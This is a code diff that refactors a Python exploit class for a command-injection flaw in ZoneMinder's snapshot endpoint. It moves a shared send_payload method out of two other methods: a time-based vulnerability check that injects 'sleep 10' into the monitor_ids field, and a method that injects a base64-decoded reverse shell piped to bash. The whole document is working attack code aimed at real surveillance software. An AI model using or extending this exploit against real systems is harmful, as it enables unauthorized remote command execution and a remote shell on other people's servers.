@@ -41,17 +41,20 @@ class ZoneminderSnapshots:
 
         return BeautifulSoup(html_content, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value')
 
-    def check_vulnerable(self) -> bool:
+    def send_payload(self, payload: str) -> None:
         data = {
             'view': 'snapshot',
             'action': 'create',
-            'monitor_ids[0][Id]': '0;sleep 10',
+            'monitor_ids[0][Id]': f'0;{payload}',
             '__csrf_magic': f'{self.get_csrf_token()}'
         }
 
+        self.connection.request('POST', '/index.php', body=urlencode(data), headers=self.headers)
+
+    def check_vulnerable(self) -> bool:
         initial_time = time.time()
 
-        self.connection.request('POST', '/index.php', body=urlencode(data), headers=self.headers)
+        self.send_payload('sleep 10')
         response = self.connection.getresponse()
 
         final_time = time.time()
@@ -64,12 +67,5 @@ class ZoneminderSnapshots:
         return True
     
     def inject_reverse_shell(self) -> None:
-        data = {
-            'view': 'snapshot',
-            'action': 'create',
-            'monitor_ids[0][Id]': f'0;echo "{self.reverse_shell}" | base64 -d | bash',
-            '__csrf_magic': f'{self.get_csrf_token()}'
-        }
-
-        self.connection.request('POST', '/index.php', body=urlencode(data), headers=self.headers)
+        self.send_payload(f'echo "{self.reverse_shell}" | base64 -d | bash')
         self.connection.close()
